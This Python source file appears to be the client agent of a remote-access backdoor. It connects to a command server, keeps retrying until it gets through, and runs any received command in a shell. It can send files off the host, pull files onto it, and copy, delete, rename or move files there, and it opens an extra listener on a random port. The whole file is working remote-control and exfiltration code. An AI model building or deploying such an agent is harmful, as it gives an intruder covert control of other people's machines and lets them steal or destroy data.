import socket
import os
import subprocess
import random
import threading
import time
import shutil

# File manipulation functions (same as before)
def copy_file(source, destination):
    try:
        shutil.copy(source, destination)
        return f"File copied from {source} to {destination}"
    except Exception as e:
        return f"Failed to copy file from {source} to {destination}. Error: {e}"

def delete_file(path):
    try:
        os.remove(path)
        return f"File deleted: {path}"
    except Exception as e:
        return f"Failed to delete file: {path}. Error: {e}"

def rename_file(old_name, new_name):
    try:
        os.rename(old_name, new_name)
        return f"File renamed from {old_name} to {new_name}"
    except Exception as e:
        return f"Failed to rename file: {old_name} to {new_name}. Error: {e}"

def paste_file(source, destination):
    try:
        shutil.move(source, destination)
        return f"File moved (pasted) from {source} to {destination}"
    except Exception as e:
        return f"Failed to move (paste) file from {source} to {destination}. Error: {e}"

def get_current_directory():
    try:
        current_directory = os.getcwd()
        return f"{current_directory}"
    except Exception as e:
        return f"Failed to get current directory. Error: {e}"

# Change directory function
def change_directory(path):
    try:
        os.chdir(path)
        path = get_current_directory()
        return f"Directory changed to: {path}"
    except Exception as e:
        return f"Failed to change directory to: {path}. Error: {e}"

def send_file(client_socket, file_path):
    try:
        if not os.path.isfile(file_path):
            print("[*] File not found.")
            return

        # Send the file size first
        file_size = os.path.getsize(file_path)
        client_socket.send(f"SEND_FILE {file_size} {os.path.basename(file_path)}".encode('utf-8'))

        # Use a larger buffer size
        buffer_size = 8192  # 8 KB
        with open(file_path, 'rb') as file:
            while True:
                data = file.read(buffer_size)
                if not data:
                    break
                client_socket.send(data)
        
        print(f"[*] Sent file: {file_path}")
    except Exception as e:
        print(f"[*] Failed to send file: {e}")

def receive_file(client_socket, file_name):
    try:
        header = client_socket.recv(1024).decode('utf-8')
        if header.startswith("SEND_FILE"):
            _, file_size, _ = header.split()
            file_size = int(file_size)

            buffer_size = 8192  # 8 KB
            with open(file_name, 'wb') as file:
                received_size = 0
                while received_size < file_size:
                    data = client_socket.recv(buffer_size)
                    if not data:  # Break if no more data is received
                        break
                    file.write(data)
                    received_size += len(data)

            print(f"[*] Received file: {file_name}")
        else:
            print("[*] Unexpected header received.")
    except Exception as e:
        print(f"[*] Failed to receive file: {e}")

def handle_commands(client_socket):
    try:
        while True:
            command = client_socket.recv(1024).decode('utf-8')
            if command.lower() == "exit":
                print("[*] Exiting...")
                break

            if not command:
                command = "pwd"

            response = ""

            # Handle file send command
            if command.startswith("sendfile"):
                _, file_path = command.split(' ', 1)
                send_file(client_socket, file_path)
            elif command.startswith("download"):
                _, file_name = command.split(' ', 1)
                receive_file(client_socket, file_name)
            elif command.startswith("copyfile"):
                _, source, destination = command.split(' ')
                response = copy_file(source, destination)
            elif command.startswith("deletefile"):
                _, path = command.split(' ')
                response = delete_file(path)
            elif command.startswith("renamefile"):
                _, old_name, new_name = command.split(' ')
                response = rename_file(old_name, new_name)
            elif command.startswith("pastefile"):
                _, source, destination = command.split(' ')
                response = paste_file(source, destination)
            elif command.lower() == "pwd":
                response = get_current_directory()
            elif command.startswith("cd "):
                _, path = command.split(' ')
                response = change_directory(path)
            else:
                response = execute_shell_command(command)

            # Send the command output back to the server
            client_socket.send(response.encode('utf-8'))

    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_socket.close()

# Function to handle the shell execution of commands
import subprocess

# Function to handle the shell execution of commands with streaming output
def execute_shell_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout + result.stderr
        return output if output else "No output"
    except Exception as e:
        return f"Error executing command: {e}"


def listen_for_commands(agent_port):
    listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener_socket.bind(('localhost', agent_port))
    listener_socket.listen(1)
    print(f"[*] Listening for commands on port {agent_port}...")

    while True:
        try:
            command_socket, addr = listener_socket.accept()
            print(f"[*] Accepted connection from {addr}.")
            handle_commands(command_socket)

        except Exception as e:
            print(f"Error in listener: {e}")

def connect_to_server(host, port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while True:
        try:
            client_socket.connect((host, port))
            print(f"[*] Connected to server at {host}:{port}")
            break
        except ConnectionRefusedError:
            print("[*] Connection refused, retrying...")
            time.sleep(5)
        except Exception as e:
            print(f"[*] Unexpected error: {e}")
            time.sleep(5)  # Retry after a delay

    # Generate a random port for the agent listener
    agent_port = random.randint(1024, 65535)
    print(f"[*] Agent will listen on port {agent_port}")

    # Start the listener thread for incoming commands
    threading.Thread(target=listen_for_commands, args=(agent_port,), daemon=True).start()

    # Send the port to the server
    client_socket.send(f"AGENT_PORT {agent_port}".encode('utf-8'))

    # Start handling commands
    handle_commands(client_socket)

if __name__ == "__main__":
    host = "localhost"  # Server address
    port = 9999         # Server port
    connect_to_server(host, port)
